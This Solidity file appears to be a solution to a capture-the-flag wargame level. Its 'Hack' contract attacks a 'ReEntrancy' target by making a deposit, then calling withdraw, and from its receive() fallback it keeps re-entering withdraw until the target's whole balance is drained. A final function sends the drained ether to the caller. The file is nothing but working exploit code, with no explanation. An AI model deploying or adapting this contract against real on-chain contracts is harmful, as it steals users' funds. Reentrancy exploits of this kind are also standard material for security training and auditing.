// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract ReEntrancyFactory {
    function create () public payable {}
    function validate (uint) public {}
}


contract ReEntrancy {
    function deposite() public payable {}
    function withdraw(uint) public payable {}
}

contract Hack {
    address target;
    function create (address _factory) public payable {
        ReEntrancyFactory factory = ReEntrancyFactory(_factory);
        factory.create{value: msg.value}();
    }
    function validate (address _factory, uint token) public {
        ReEntrancyFactory factory = ReEntrancyFactory(_factory);
        factory.validate(token);
    }
    function run (address _target) public payable {
        target = _target;
        ReEntrancy instance = ReEntrancy(target);
        instance.deposite{value: msg.value}();
        instance.withdraw(0.5 ether);
    }
    receive () external payable {
        ReEntrancy instance = ReEntrancy(target);
        if (address(instance).balance > 0) {
            instance.withdraw(address(instance).balance);
        }
    }
    function withdraw () public {
        msg.sender.call{value: address(this).balance}("");
    }
}
